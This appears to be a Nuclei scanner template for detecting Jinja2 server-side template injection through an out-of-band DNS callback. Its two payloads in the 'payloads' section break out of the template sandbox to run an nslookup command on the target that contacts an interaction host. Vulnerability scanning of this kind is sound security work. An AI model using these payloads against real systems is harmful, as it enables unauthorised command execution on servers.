id: jinja2-oob
info:
  name: Jinja2 - Out of Band Template Injection
  author: 0xAwali,DhiyaneshDK,ritikchaddha
  severity: high
  reference:
    - https://pypi.org/project/Jinja2/
    - https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756
  metadata:
    verified: true
  tags: dast,oast,oob,ssti,vuln
http:
  - fuzzing:
      - fuzz:
          - '{{injection}}'
        mode: single
        parts:
          - query
          - body
        type: postfix
    matchers:
      - condition: and
        # digest: 4b0a0048304602210086b40c0058e674b6dc11ee0466e3df28503d18dfbd9137dc157b5861f6e97b7302210082eadd2e6ece7e9fdb9de9179f4c8fd342aaaf426882b7028ac46f511c5d62bd:922c64590222798bb761d5b6d8e72950

        dsl:
          - contains(interactsh_protocol,'dns')
          - contains(interactsh_request,'srv')
        name: request-matcher
        type: dsl
    payloads:
      injection:
        - '{{self.__init__.__globals__.__builtins__.__import__(''os'').popen(''nslookup+-type=SRV+{{interactsh-url}}'').read()}}'
        - '{{ cycler.__init__.__globals__.os.popen(''nslookup+-type=SRV+{{interactsh-url}}'').read() }}'
    pre-condition:
      - dsl:
          - method == "GET"
          - method == "POST"
          - method == "PUT"
        type: dsl
    skip-variables-check: true
